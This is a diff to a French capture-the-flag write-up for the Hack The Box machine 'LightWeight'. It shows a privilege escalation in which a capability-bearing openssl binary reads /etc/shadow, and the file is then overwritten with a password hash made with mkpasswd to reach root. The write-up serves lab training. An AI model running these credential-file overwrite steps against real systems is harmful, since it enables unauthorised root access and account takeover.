@@ -277,14 +277,7 @@ Tout d'abord on va crée notre mot de passe :
 
 	root@Seyptoo:~/htb# mkpasswd -m sha-512 seyptoo
 	$6$wtB8S4kweNAe37hN$Rttczh0dwMiKu7cAVcSQkTx8yxtG1qEwvBNrFommSsEmrQJ5LJjeOAKFQZw5QGH59VRqkE1bBFXsyrF6sQMS/0
-
-Ensuite dans la machine LightWeight, nous allons créer clé privée avec openssl, et également de créer un fichier pem.
-
-	[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl genrsa -out /tmp/key.pem 2048 # private key.
-	[...SNIP...]
-	[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes # pem.
-	[...SNIP...]
-
+	
 Une fois que c'est ok, nous allons tout simplement lire le fichier /etc/shadow et de le mettre dans le dossier /tmp et ensuite de modifier le mot de passe root.
 
 	[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl enc -in /etc/shadow -out /tmp/shadow
@@ -294,8 +287,7 @@ Une fois que c'est ok, nous allons tout simplement lire le fichier /etc/shadow e
 	
 Une fois que la valeur a été modifié nous allons transmettre ce fichier dans le dossier /etc.
 
-	[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem
-	[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/key.pem -out /etc/shadow
+	[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl enc -in /tmp/shadow -out /etc/shadow
 	[ldapuser1@lightweight tmp]$ su - root
 	Password: seyptoo
 	Last login: Thu May  9 09:01:37 BST 2019 on pts/5
@@ -305,5 +297,3 @@ Une fois que la valeur a été modifié nous allons transmettre ce fichier dans 
 	uid=0(root) gid=0(root) groups=0(root)
 
 ![frustrated-computer-baboon](https://media.giphy.com/media/1tHzw9PZCB3gY/giphy.gif)
-
-Parfait nous sommes root. C'étais ma box préférer n'hésiter pas à mettre un star dans ma repo ça me feras grave plaisir ! :D
